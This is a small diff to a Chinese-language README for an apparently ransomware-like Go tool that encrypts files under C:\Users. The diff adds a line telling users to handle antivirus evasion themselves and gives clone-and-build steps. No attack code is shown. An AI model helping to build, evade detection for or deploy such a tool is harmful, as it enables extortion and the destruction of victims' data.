@@ -1,4 +1,5 @@
 # 请谨慎运行目前只对C:\Users白名单文件方式加密
+# 免杀问题自行解决
 ## 使用
 git clone https://github.com/RuanLang0777/Smallfat.git && cd Smallfat && go build
 ## 自定义加密文件
